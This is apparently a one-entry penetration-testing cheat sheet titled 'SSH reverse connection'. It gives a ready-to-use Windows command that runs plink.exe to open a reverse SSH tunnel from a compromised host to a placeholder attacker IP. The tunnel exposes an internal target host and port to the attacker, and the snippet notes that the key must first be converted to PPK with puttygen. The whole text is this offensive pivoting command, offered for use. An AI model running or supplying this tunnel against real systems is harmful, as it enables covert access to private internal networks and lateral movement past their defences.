# SSH reverse connection
```dos
cmd.exe /c echo y | .\plink.exe -R (localport):(targetip):(targetport) user@(attackerip) -i KEYFILE -N
# must convert the key from ssh-keygen to ppk using puttygen
```